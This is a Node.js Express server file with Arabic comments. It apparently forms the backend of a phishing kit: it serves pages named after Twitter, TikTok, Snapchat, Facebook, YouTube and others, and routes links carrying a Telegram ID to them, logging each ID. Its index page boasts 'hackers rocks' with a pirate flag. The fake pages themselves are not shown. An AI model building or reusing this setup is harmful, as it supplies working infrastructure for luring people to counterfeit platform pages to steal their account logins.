const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// قائمة المواقع المتاحة
const availableSites = [
  'twitter.html',
  'Bobji.html',
  'tik.html',
  'snap.html',
  'face.html',
  'yot.html',
  'des.html'
  // يمكنك إضافة المزيد من المواقع هنا
];

// Middleware لتقديم الملفات الثابتة من مجلد public
app.use(express.static(path.join(__dirname, 'public')));

// Middleware للتعامل مع معرفات Telegram
app.use((req, res, next) => {
  // استخراج المسار وفحص إذا كان يحتوي على معرف Telegram
  const pathParts = req.path.split('/').filter(part => part !== '');
  
  if (pathParts.length >= 2) {
    const siteName = pathParts[0];
    const telegramId = pathParts[1];
    
    // التحقق من أن الموقع موجود
    const siteFile = `${siteName}.html`;
    if (availableSites.includes(siteFile)) {
      // إذا كان هناك معرف Telegram، نقوم بتوجيه الطلب إلى الموقع المناسب
      req.siteName = siteName;
      req.telegramId = telegramId;
      req.url = `/${siteFile}`;
    }
  }
  
  next();
});

// Route للصفحة الرئيسية
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="ar">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>خادم المواقع المتعددة</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                direction: rtl;
                text-align: center;
                padding: 50px;
                background-color: #f5f5f5;
            }
            h1 {
                color: #333;
            }
            .site-list {
                list-style: none;
                padding: 0;
                max-width: 500px;
                margin: 30px auto;
            }
            .site-list li {
                background: white;
                margin: 10px 0;
                padding: 15px;
                border-radius: 5px;
                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            }
            .site-list a {
                text-decoration: none;
                color: #007bff;
                font-weight: bold;
            }
        </style>
    </head>
    <body>
        <h1>خادم المواقع المتعددة</h1>
        <p>المواقع المتاحة:</p>
        <ul class="site-list">
            ${availableSites.map(site => {
              const siteName = site.replace('.html', '');
              return `<li><a href="/${siteName}">${siteName}</a></li>`;
            }).join('')}
        </ul>
        <p>قراصنه روكس 🏴‍☠️</p>
    </body>
    </html>
  `);
});

// Route للتعامل مع المواقع بدون معرف Telegram
app.get('/:siteName', (req, res) => {
  const siteName = req.params.siteName;
  const siteFile = `${siteName}.html`;
  
  if (availableSites.includes(siteFile)) {
    res.sendFile(path.join(__dirname, 'public', siteFile));
  } else {
    res.status(404).send(`
      <!DOCTYPE html>
      <html lang="ar">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>404 - الصفحة غير موجودة</title>
          <style>
              body {
                  font-family: Arial, sans-serif;
                  direction: rtl;
                  text-align: center;
                  padding: 50px;
                  background-color: #f5f5f5;
              }
              h1 {
                  color: #d9534f;
              }
              a {
                  color: #007bff;
                  text-decoration: none;
              }
          </style>
      </head>
      <body>
          <h1>404 - الصفحة غير موجودة</h1>
          <p>الموقع المطلوب غير موجود.</p>
          <p><a href="/">العودة إلى الصفحة الرئيسية</a></p>
      </body>
      </html>
    `);
  }
});

// Route للتعامل مع المواقع مع معرف Telegram
app.get('/:siteName/:telegramId', (req, res) => {
  const siteName = req.params.siteName;
  const telegramId = req.params.telegramId;
  const siteFile = `${siteName}.html`;
  
  if (availableSites.includes(siteFile)) {
    // هنا يمكنك إضافة أي معالجة إضافية متعلقة بمعرف Telegram
    console.log(`طلب موقع ${siteName} مع معرف Telegram: ${telegramId}`);
    
    // تقديم الموقع المطلوب
    res.sendFile(path.join(__dirname, 'public', siteFile));
  } else {
    res.status(404).send(`
      <!DOCTYPE html>
      <html lang="ar">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>404 - الصفحة غير موجودة</title>
          <style>
              body {
                  font-family: Arial, sans-serif;
                  direction: rtl;
                  text-align: center;
                  padding: 50px;
                  background-color: #f5f5f5;
              }
              h1 {
                  color: #d9534f;
              }
              a {
                  color: #007bff;
                  text-decoration: none;
              }
          </style>
      </head>
      <body>
          <h1>404 - الصفحة غير موجودة</h1>
          <p>الموقع المطلوب غير موجود.</p>
          <p><a href="/">العودة إلى الصفحة الرئيسية</a></p>
      </body>
      </html>
    `);
  }
});

// بدء الخادم
app.listen(PORT, () => {
  console.log(`الخادم يعمل على المنفذ ${PORT}`);
  console.log(`يمكنك الوصول إليه عبر: http://localhost:${PORT}`);
  console.log('المواقع المتاحة:');
  availableSites.forEach(site => {
    const siteName = site.replace('.html', '');
    console.log(`- http://localhost:${PORT}/${siteName}`);
    console.log(`- http://localhost:${PORT}/${siteName}/08874555 (مع معرف Telegram كمثال)`);
  });
});
